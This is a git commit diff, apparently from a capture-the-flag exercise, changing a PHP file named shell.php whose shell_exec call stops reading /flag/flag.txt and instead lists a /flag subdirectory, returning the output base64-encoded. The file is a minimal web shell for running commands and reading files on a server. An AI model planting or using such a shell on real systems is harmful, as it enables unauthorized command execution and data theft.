d485f251c66962dfe00ce6b24740e187ebfcee9f
SergioVE <55409282+Esmichel@users.noreply.github.com>
2025-10-22 19:30:08 +0200

    Update shell command to list /flag directory
    Change command to list files in the /flag directory instead of reading the flag file.

--- shell.php
+++ shell.php
@@ -1,4 +1,4 @@
 <?php
 // list /flag directory and return base64 to avoid content-type issues
-$out = shell_exec('cat /flag/flag.txt 2>&1');
+$out = shell_exec('ls -la /flag/0528026a9109f91adde76ff8375df9dc 2>&1');
 echo base64_encode($out);
